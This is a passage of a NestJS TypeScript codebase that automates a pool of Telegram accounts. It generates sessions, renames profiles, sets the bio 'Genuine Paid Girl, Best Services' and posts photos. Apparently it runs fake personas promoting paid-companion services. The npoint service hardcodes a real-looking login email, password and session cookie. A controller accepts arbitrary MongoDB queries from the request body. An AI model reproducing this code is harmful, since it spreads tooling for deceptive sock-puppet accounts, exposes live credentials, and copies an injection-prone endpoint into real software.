bufferClientDto: CreateBufferClientDto | UpdateBufferClientDto = {\r\n                                mobile: existingMobile,\r\n                                availableDate,\r\n                                session: existingClientUser.session,\r\n                                tgId: existingClientUser.tgId,\r\n                                channels: 170\r\n                            }\r\n                            const updatedBufferClient = await this.bufferClientService.createOrUpdate(existingMobile, bufferClientDto);\r\n                            // await this.archivedClientService.update(existingMobile, existingClient);\r\n                            console.log(\"client Archived: \", updatedBufferClient);\r\n                            await fetchWithTimeout(`${ppplbot()}&text=Client Archived`);\r\n                        } else {\r\n                            console.log(\"Client Archive Skipped\")\r\n                            await fetchWithTimeout(`${ppplbot()}&text=Client Archive Skipped`);\r\n                        }\r\n                    } catch (error) {\r\n                        console.log(\"Cannot Archive Old Client\");\r\n                        const errorDetails = parseError(error);\r\n                        if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"session_revoked\", \"user_deactivated_ban\"])) {\r\n                            console.log(\"Deleting User: \", existingClientUser.mobile);\r\n                            await this.bufferClientService.remove(existingClientUser.mobile);\r\n                            await this.archivedClientService.remove(existingClientUser.mobile);\r\n                        } else {\r\n                            console.log('Not Deleting user');\r\n                        }\r\n                    }\r\n                }\r\n            } catch (error) {\r\n                parseError(error);\r\n            }\r\n            this.telegramService.setActiveClientSetup(undefined)\r\n\r\n            console.log(\"Update finished Exitting Exiiting TG Service\");\r\n            await fetchWithTimeout(`${ppplbot()}&text=Update finished`);\r\n            await this.telegramService.disconnectAll();\r\n\r\n        } catch (e) {\r\n            parseError(e);\r\n            this.telegramService.setActiveClientSetup(undefined)\r\n        }\r\n    }\r\n\r\n    async updateClient(clientId: string) {\r\n        const client = await this.findOne(clientId);\r\n        try {\r\n            await CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());\r\n            const telegramClient = await this.telegramService.createClient(client.mobile, true, false);\r\n            await sleep(2000)\r\n            const me = await telegramClient.getMe();\r\n            if (me.username !== client.username || !me.username.toLowerCase().startsWith(me.firstName.split(' ')[0].toLowerCase())) {\r\n                const username = (clientId?.match(/[a-zA-Z]+/g)).toString();\r\n                const userCaps = username[0].toUpperCase() + username.slice(1);\r\n                let baseUsername = `${userCaps}_Red` + fetchNumbersFromString(clientId);\r\n                const updatedUsername = await telegramClient.updateUsername(baseUsername);\r\n                await this.update(client.clientId, { username: updatedUsername })\r\n            }\r\n            await sleep(2000)\r\n            if (me.firstName !== client.name) {\r\n                await telegramClient.updateProfile(client.name, \"Genuine Paid Girl🥰, Best Services❤️\");\r\n            }\r\n            await sleep(3000)\r\n            await telegramClient.deleteProfilePhotos();\r\n            await sleep(3000)\r\n            await telegramClient.updatePrivacy();\r\n            await sleep(3000)\r\n            const rootPath = process.cwd();\r\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\r\n            await sleep(3000);\r\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\r\n            await sleep(3000);\r\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\r\n            await sleep(2000);\r\n            await this.telegramService.deleteClient(client.mobile)\r\n        } catch (error) {\r\n            parseError(error)\r\n        }\r\n    }\r\n\r\n\r\n    async updateClients() {\r\n        const clients = await this.findAll();\r\n        for (const client of clients) {\r\n            await this.updateClient(client.clientId)\r\n        }\r\n    }\r\n\r\n    async generateNewSession(phoneNumber: string, attempt: number = 1) {\r\n        try {\r\n            console.log(\"String Generation started\");\r\n            await fetchWithTimeout(`${ppplbot()}&text=String Generation started for NewNumber:${phoneNumber}`);\r\n            await sleep(1000);\r\n            const response = await fetchWithTimeout(`${process.env.uptimebot}/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);\r\n            if (response) {\r\n                console.log(`Code Sent successfully`, response.data);\r\n                await fetchWithTimeout(`${ppplbot()}&text=Code Sent successfully`);\r\n                await this.bufferClientService.update(phoneNumber, { availableDate: (new Date(Date.now() + (24 * 60 * 60 * 1000))).toISOString().split('T')[0] })\r\n            } else {\r\n                await fetchWithTimeout(`${ppplbot()}&text=Failed to send Code`);\r\n                console.log(\"Failed to send Code\", response);\r\n                if (attempt < 2) {\r\n                    await sleep(8000);\r\n                    await this.generateNewSession(phoneNumber, attempt + 1);\r\n                }\r\n            }\r\n        } catch (error) {\r\n            console.log(error);\r\n            if (attempt < 2) {\r\n                await sleep(8000);\r\n                await this.generateNewSession(phoneNumber, attempt + 1);\r\n            }\r\n        }\r\n    }\r\n\r\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<Client[]> {\r\n        try {\r\n            if (!query) {\r\n                throw new BadRequestException('Query is invalid.');\r\n            }\r\n            const queryExec = this.clientModel.find(query);\r\n\r\n            if (sort) {\r\n                queryExec.sort(sort);\r\n            }\r\n\r\n            if (limit) {\r\n                queryExec.limit(limit);\r\n            }\r\n\r\n            if (skip) {\r\n                queryExec.skip(skip);\r\n            }\r\n\r\n            return await queryExec.exec();\r\n        } catch (error) {\r\n            throw new InternalServerErrorException(error.message);\r\n        }\r\n    }\r\n\r\n    async addPromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\r\n        return this.clientModel.findOneAndUpdate(\r\n            { clientId }, // Filter by clientId\r\n            { $addToSet: { promoteMobile: mobileNumber } }, // Add only if it doesn't already exist\r\n            { new: true } // Return the updated document\r\n        ).exec();\r\n    }\r\n\r\n    async removePromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\r\n        return this.clientModel.findOneAndUpdate(\r\n            { clientId }, // Filter by clientId\r\n            { $pull: { promoteMobile: mobileNumber } }, // Remove the specified number\r\n            { new: true } // Return the updated document\r\n        ).exec();\r\n    }\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateClientDto {\r\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\r\n    readonly channelLink: string;\r\n\r\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\r\n    readonly dbcoll: string;\r\n\r\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\r\n    readonly link: string;\r\n\r\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\r\n    readonly name: string;\r\n\r\n    @ApiProperty({ example: '+916265240911', description: 'Phone number of the user' })\r\n    readonly mobile: string;\r\n\r\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\r\n    readonly password: string;\r\n\r\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\r\n    readonly repl: string;\r\n\r\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\r\n    readonly promoteRepl: string;\r\n\r\n    @ApiProperty({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' })\r\n    readonly session: string;\r\n\r\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\r\n    readonly username: string;\r\n\r\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\r\n    readonly clientId: string;\r\n\r\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\r\n    readonly deployKey: string;\r\n\r\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\r\n    readonly mainAccount: string;\r\n\r\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\r\n    readonly product: string;\r\n\r\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user', required: false, type: [String] })\r\n    readonly promoteMobile?: string[];\r\n}\r\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Transform, TransformFnParams } from 'class-transformer';\r\nimport { IsOptional, IsString, IsArray, IsUrl, Matches, ArrayNotEmpty } from 'class-validator';\r\n\r\nexport class SearchClientDto {\r\n    @ApiPropertyOptional({ description: 'Client ID of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\r\n    @IsOptional()\r\n    @IsString()\r\n    @Matches(/^[a-z0-9_-]{3,50}$/i, { message: 'Invalid client ID format' })\r\n    clientId?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Database collection name' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\r\n    @IsOptional()\r\n    @IsString()\r\n    dbcoll?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Channel link of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsString()\r\n    channelLink?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Link of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsUrl({}, { message: 'Invalid URL format' })\r\n    link?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Name of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsString()\r\n    name?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Phone number of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @Matches(/^\\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' })\r\n    number?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Password of the client' })\r\n    @IsOptional()\r\n    @IsString()\r\n    password?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Repl link of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsUrl({}, { message: 'Invalid URL format' })\r\n    repl?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Promotion Repl link of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsUrl({}, { message: 'Invalid URL format' })\r\n    promoteRepl?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Clientname of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsString()\r\n    clientName?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Deployment key URL' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsUrl({}, { message: 'Invalid URL format' })\r\n    deployKey?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Main account of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\r\n    @IsOptional()\r\n    @IsString()\r\n    mainAccount?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Product associated with the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsString()\r\n    product?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Promote mobile numbers of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.map((v: string) => v?.trim()))\r\n    @IsOptional()\r\n    @IsArray()\r\n    @ArrayNotEmpty({ message: 'Promote mobile numbers must not be empty if provided' })\r\n    @Matches(/^\\+?[0-9]{10,15}$/, { each: true, message: 'Invalid phone number format in promoteMobile' })\r\n    promoteMobile?: string[];\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreateClientDto } from './create-client.dto';\r\n\r\nexport class UpdateClientDto extends PartialType(CreateClientDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type ClientDocument = Client & Document;\r\n\r\n@Schema({\r\n    collection: 'clients', versionKey: false, autoIndex: true, timestamps: true,\r\n    toJSON: {\r\n        virtuals: true,\r\n        transform: (doc, ret) => {\r\n            delete ret._id;\r\n        },\r\n    },\r\n})\r\nexport class Client {\r\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\r\n    @Prop({ required: true })\r\n    channelLink: string;\r\n\r\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\r\n    @Prop({ required: true })\r\n    dbcoll: string;\r\n\r\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\r\n    @Prop({ required: true })\r\n    link: string;\r\n\r\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\r\n    @Prop({ required: true })\r\n    name: string;\r\n\r\n    @ApiProperty({ example: '916265240911', description: 'mobile number of the user' })\r\n    @Prop({ required: true })\r\n    mobile: string;\r\n\r\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\r\n    @Prop({ required: true })\r\n    password: string;\r\n\r\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\r\n    @Prop({ required: true })\r\n    repl: string;\r\n\r\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\r\n    @Prop({ required: true })\r\n    promoteRepl: string;\r\n\r\n    @ApiProperty({ example: '1BQANOTEuM==', description: 'Session token' })\r\n    @Prop({ required: true })\r\n    session: string;\r\n\r\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\r\n    @Prop({ required: true })\r\n    username: string;\r\n\r\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\r\n    @Prop({ required: true })\r\n    clientId: string;\r\n\r\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\r\n    @Prop({ required: true })\r\n    deployKey: string;\r\n\r\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\r\n    @Prop({ required: true })\r\n    mainAccount: string;\r\n\r\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\r\n    @Prop({ required: true })\r\n    product: string;\r\n\r\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user' })\r\n    @Prop({ required: false, type: [String] })\r\n    promoteMobile: string[];\r\n}\r\n\r\nexport const ClientSchema = SchemaFactory.createForClass(Client);\r\n","import {\r\n    Controller,\r\n    Get,\r\n    Post,\r\n    Put,\r\n    Param,\r\n    Body,\r\n    HttpException,\r\n    HttpStatus,\r\n  } from '@nestjs/common';\r\n  import { NpointService } from './npoint.service';\r\n  import {\r\n    ApiTags,\r\n    ApiOperation,\r\n    ApiParam,\r\n    ApiBody,\r\n    ApiResponse,\r\n  } from '@nestjs/swagger';\r\n  \r\n  @ApiTags('NPoint API') // Group endpoints under \"NPoint API\" in Swagger UI\r\n  @Controller('npoint')\r\n  export class NpointController {\r\n    constructor(private readonly npointService: NpointService) {}\r\n  \r\n    @Get('documents/:id')\r\n    @ApiOperation({ summary: 'Fetch a document by ID' }) // Description of the endpoint\r\n    @ApiParam({ name: 'id', description: 'The ID of the document to fetch' }) // Document the parameter\r\n    @ApiResponse({\r\n      status: 200,\r\n      description: 'Document fetched successfully',\r\n    })\r\n    @ApiResponse({ status: 404, description: 'Document not found' })\r\n    async fetchDocument(@Param('id') id: string) {\r\n      try {\r\n        return await this.npointService.fetchDocument(id);\r\n      } catch (error) {\r\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n      }\r\n    }\r\n  \r\n    @Post('documents')\r\n    @ApiOperation({ summary: 'Post a new document' })\r\n    @ApiBody({\r\n      description: 'The document to post',\r\n      schema: {\r\n        example: {\r\n          title: 'My Document',\r\n          content: 'This is the content of the document.',\r\n        },\r\n      },\r\n    })\r\n    @ApiResponse({\r\n      status: 201,\r\n      description: 'Document posted successfully',\r\n    })\r\n    @ApiResponse({ status: 400, description: 'Invalid input' })\r\n    async postDocument(@Body() document: any) {\r\n      try {\r\n        return await this.npointService.postDocument(document);\r\n      } catch (error) {\r\n        throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n      }\r\n    }\r\n\r\n    @Get('documents')\r\n    @ApiOperation({ summary: 'Fetch all documents' })\r\n    @ApiResponse({\r\n      status: 200,\r\n      description: 'List of all documents fetched successfully',\r\n    })\r\n    @ApiResponse({ status: 500, description: 'Internal server error' })\r\n    async fetchAllDocuments() {\r\n      try {\r\n        return await this.npointService.fetchAllDocuments();\r\n      } catch (error) {\r\n        throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n      }\r\n    }  \r\n  \r\n    @Put('documents/:id')\r\n    @ApiOperation({ summary: 'Update a document by ID' })\r\n    @ApiParam({ name: 'id', description: 'The ID of the document to update' })\r\n    @ApiBody({\r\n      description: 'The updated document',\r\n      schema: {\r\n        example: {\r\n          title: 'Updated Document',\r\n          content: 'This is the updated content of the document.',\r\n        },\r\n      },\r\n    })\r\n    @ApiResponse({\r\n      status: 200,\r\n      description: 'Document updated successfully',\r\n    })\r\n    @ApiResponse({ status: 404, description: 'Document not found' })\r\n    async updateDocument(@Param('id') id: string, @Body() updatedDocument: any) {\r\n      try {\r\n        return await this.npointService.updateDocument(id, updatedDocument);\r\n      } catch (error) {\r\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n      }\r\n    }\r\n  }","import { Module } from '@nestjs/common';\r\nimport { NpointService } from './npoint.service';\r\nimport { NpointController } from './npoint.controller';\r\n\r\n@Module({\r\n  controllers: [NpointController],\r\n  providers: [NpointService],\r\n  exports: [NpointService]\r\n})\r\nexport class NpointModule {}","import { Injectable, Logger } from '@nestjs/common';\r\nimport axios from 'axios';\r\n\r\n@Injectable()\r\nexport class NpointService {\r\n    private readonly logger = new Logger(NpointService.name);\r\n    private csrfToken: string | null = null;\r\n    private cookie: string | null = '_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5';\r\n    private readonly baseUrl = 'https://www.npoint.io'; // Replace with your API base URL\r\n    private readonly signInUrl = 'https://www.npoint.io/users/sign_in'; // Replace with your sign-in API URL\r\n\r\n    // Method to fetch CSRF token from the sign-in API\r\n    private async fetchCsrfToken(): Promise<string> {\r\n        this.logger.debug('Fetching CSRF token...');\r\n        try {\r\n            let data = JSON.stringify({\r\n                \"user\": {\r\n                    \"email\": \"dodieajt@gmail.com\",\r\n                    \"password\": \"Ajtdmwajt1@\"\r\n                }\r\n            });\r\n\r\n            let config = {\r\n                method: 'post',\r\n                maxBodyLength: Infinity,\r\n                url: this.signInUrl,\r\n                headers: {\r\n                    'Content-Type': 'application/json',\r\n                    'Cookie': this.cookie\r\n                },\r\n                data: data\r\n            };\r\n\r\n            const response = await axios.request(config)\r\n            console.log(\"Cookie:\", response.headers['set-cookie'][0]);\r\n            this.cookie = response.headers['set-cookie'][0];\r\n            // Extract CSRF token from the response (adjust based on your API response structure)\r\n            this.csrfToken = await this.fetchCsrfTokenFromHtml(response.data);\r\n\r\n            if (!this.csrfToken) {\r\n                throw new Error('CSRF token not found in the sign-in response.');\r\n            }\r\n\r\n            this.logger.debug('CSRF token fetched successfully.');\r\n            return this.csrfToken;\r\n        } catch (error) {\r\n            this.logger.error(`Failed to fetch CSRF token: ${error.message}`);\r\n            throw new Error(`Failed to fetch CSRF token: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    // Method to ensure CSRF token is available\r\n    private async ensureCsrfToken(): Promise<void> {\r\n        if (!this.csrfToken) {\r\n            await this.fetchCsrfToken();\r\n        }\r\n    }\r\n\r\n    // Method to fetch a document\r\n    async fetchDocument(documentId: string): Promise<any> {\r\n        this.logger.debug(`Fetching document with ID: ${documentId}`);\r\n        await this.ensureCsrfToken();\r\n\r\n        try {\r\n            const response = await axios.get(`${this.baseUrl}/documents/${documentId}`, {\r\n                headers: {\r\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\r\n                    'Cookie': this.cookie\r\n                },\r\n            });\r\n\r\n            this.logger.debug(`Document with ID: ${documentId} fetched successfully.`);\r\n            return response.data;\r\n        } catch (error) {\r\n            this.logger.error(`Failed to fetch document with ID: ${documentId}: ${error.message}`);\r\n            throw new Error(`Failed to fetch document: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    // Method to post a document\r\n    async postDocument(document: any): Promise<any> {\r\n        this.logger.debug('Posting a new document...');\r\n        await this.ensureCsrfToken();\r\n\r\n        try {\r\n            const response = await axios.post(`${this.baseUrl}/documents`, { \"generate_contents\": true }, {\r\n                headers: {\r\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\r\n                    'Cookie': this.cookie\r\n                },\r\n            });\r\n\r\n            this.logger.debug(`Document posted successfully. Updating document with token: ${response.data.token}`);\r\n            await this.updateDocument(response.data.token, document);\r\n            return response.data;\r\n        } catch (error) {\r\n            this.logger.error(`Failed to post document: ${error.message}`);\r\n            throw new Error(`Failed to post document: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    // Method to update a document\r\n    async updateDocument(documentId: string, updatedDocument: any): Promise<any> {\r\n        this.logger.debug(`Updating document with ID: ${documentId}`);\r\n        await this.ensureCsrfToken();\r\n\r\n        // const oldDocument = (await axios.get(`https://api.npoint.io/${documentId}`)).data;\r\n        const body =\r\n        {\r\n            \"contents\": JSON.stringify(updatedDocument),\r\n            \"original_contents\": JSON.stringify(updatedDocument),\r\n            \"schema\": null,\r\n            \"original_schema\": \"\"\r\n        }\r\n\r\n        try {\r\n            const response = await axios.put(\r\n                `${this.baseUrl}/documents/${documentId}`,\r\n                body,\r\n                {\r\n                    headers: {\r\n                        'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\r\n                        'Cookie': this.cookie\r\n                    },\r\n                },\r\n            );\r\n\r\n            this.logger.debug(`Document with ID: ${documentId} updated successfully.`);\r\n            return response.data;\r\n        } catch (error) {\r\n            this.logger.error(`Failed to update document with ID: ${documentId}: ${error.message}`);\r\n            throw new Error(`Failed to update document: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    async fetchAllDocuments(): Promise<any[]> {\r\n        await this.ensureCsrfToken();\r\n\r\n        try {\r\n            const response = await axios.get(`${this.baseUrl}/documents`, {\r\n                headers: {\r\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\r\n                    'Cookie': this.cookie\r\n                },\r\n            });\r\n\r\n            return response.data;\r\n        } catch (error) {\r\n            throw new Error(`Failed to fetch all documents: ${error.message}`);\r\n        }\r\n    }\r\n\r\n    async fetchCsrfTokenFromHtml(data) {\r\n        try {\r\n            // Step 1: Use a regular expression to match the CSRF token in the <meta> tag\r\n            const csrfTokenMatch = data.match(/<meta name=\"csrf-token\" content=\"([^\"]+)\"/);\r\n\r\n            // Step 2: Check if the CSRF token was found\r\n            if (!csrfTokenMatch || !csrfTokenMatch[1]) {\r\n                throw new Error('CSRF token not found in the HTML response.');\r\n            }\r\n\r\n            // Step 3: Extract the CSRF token\r\n            const csrfToken = csrfTokenMatch[1];\r\n\r\n            // Log the CSRF token (optional)\r\n            console.log('CSRF Token:', csrfToken);\r\n\r\n            return csrfToken;\r\n        } catch (error) {\r\n            console.error('Error fetching CSRF token:', error);\r\n        }\r\n    }\r\n}","import { ApiProperty } from '@nestjs/swagger';\r\nimport {  IsNumber, IsString } from 'class-validator';\r\n\r\nexport class CreatePromoteClientDto {\r\n  @ApiProperty({\r\n    description: 'Telegram ID of the client',\r\n    example: '123456789',\r\n  })\r\n  @IsString()\r\n  readonly tgId: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Mobile number of the client',\r\n    example: '+1234567890',\r\n  })\r\n  @IsString()\r\n  readonly mobile: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Date of the session',\r\n    example: '2023-06-22',\r\n  })\r\n  @IsString()\r\n  readonly availableDate: string;\r\n\r\n  @ApiProperty({\r\n    description: 'lastActive identifier',\r\n    example: '2023-06-22',\r\n  })\r\n  @IsString()\r\n  readonly lastActive: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Channel Count',\r\n    example: 23,\r\n    type: Number\r\n  })\r\n  @IsNumber()\r\n  readonly channels: number;\r\n}\r\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\r\n\r\nexport class SearchPromoteClientDto {\r\n  @ApiPropertyOptional({\r\n    description: 'Telegram ID of the client',\r\n    example: '123456789',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly tgId?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Mobile number of the client',\r\n    example: '+1234567890',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly mobile?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'availableDate of the promoteClient',\r\n    example: '2023-06-22',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly availableDate?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Channel Count',\r\n    example: 23,\r\n    type: Number\r\n  })\r\n  @IsNumber()\r\n  readonly channels?: number;\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreatePromoteClientDto } from './create-promote-client.dto';\r\n\r\nexport class UpdatePromoteClientDto extends PartialType(CreatePromoteClientDto) {}\r\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody, ApiParam } from '@nestjs/swagger';\r\nimport { PromoteClientService } from './promote-client.service';\r\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\r\nimport { SearchPromoteClientDto } from './dto/search-promote-client.dto';\r\nimport { PromoteClient } from './schemas/promote-client.schema';\r\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\r\n\r\n@ApiTags('Promote Clients')\r\n@Controller('promoteclients')\r\nexport class PromoteClientController {\r\n  constructor(private readonly clientService: PromoteClientService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  async create(@Body() createClientDto: CreatePromoteClientDto): Promise<PromoteClient> {\r\n    return this.clientService.create(createClientDto);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  async search(@Query() query: SearchPromoteClientDto): Promise<PromoteClient[]> {\r\n    return this.clientService.search(query);\r\n  }\r\n\r\n  @Get('joinChannelsForPromoteClients')\r\n  @ApiOperation({ summary: 'Join Channels for PromoteClients' })\r\n  async joinChannelsforPromoteClients(): Promise<string> {\r\n    return this.clientService.joinchannelForPromoteClients();\r\n  }\r\n\r\n  @Get('checkPromoteClients')\r\n  @ApiOperation({ summary: 'Check Promote Clients' })\r\n  async checkpromoteClients(): Promise<string> {\r\n    this.clientService.checkPromoteClients();\r\n    return \"initiated Checking\"\r\n  }\r\n\r\n  @Post('addNewUserstoPromoteClients')\r\n  @ApiOperation({ summary: 'Add New Users to Promote Clients' })\r\n  @ApiBody({ type: Object })\r\n  async addNewUserstoPromoteClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\r\n    this.clientService.addNewUserstoPromoteClients(body.badIds, body.goodIds);\r\n    return \"initiated Checking\"\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  async findAll(): Promise<PromoteClient[]> {\r\n    return this.clientService.findAll();\r\n  }\r\n\r\n  @Get('SetAsPromoteClient/:mobile')\r\n  @ApiOperation({ summary: 'Set as Promote Client' })\r\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n  async setAsPromoteClient(\r\n    @Param('mobile') mobile: string,\r\n  ) {\r\n    return await this.clientService.setAsPromoteClient(mobile);\r\n  }\r\n\r\n  @Get(':mobile')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  async findOne(@Param('mobile') mobile: string): Promise<PromoteClient> {\r\n    return this.clientService.findOne(mobile);\r\n  }\r\n\r\n  @Patch(':mobile')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\r\n    return this.clientService.update(mobile, updateClientDto);\r\n  }\r\n\r\n  @Put(':mobile')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\r\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\r\n  }\r\n\r\n  @Delete(':mobile')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  async remove(@Param('mobile') mobile: string): Promise<void> {\r\n    return this.clientService.remove(mobile);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  @ApiBody({ type: Object })\r\n  async executeQuery(@Body() query: object): Promise<any> {\r\n    try {\r\n      return await this.clientService.executeQuery(query);\r\n    } catch (error) {\r\n      throw error;  // You might want to handle errors more gracefully\r\n    }\r\n  }\r\n\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { PromoteClientService } from './promote-client.service';\r\nimport { PromoteClientController } from './promote-client.controller';\r\nimport { PromoteClientSchema } from 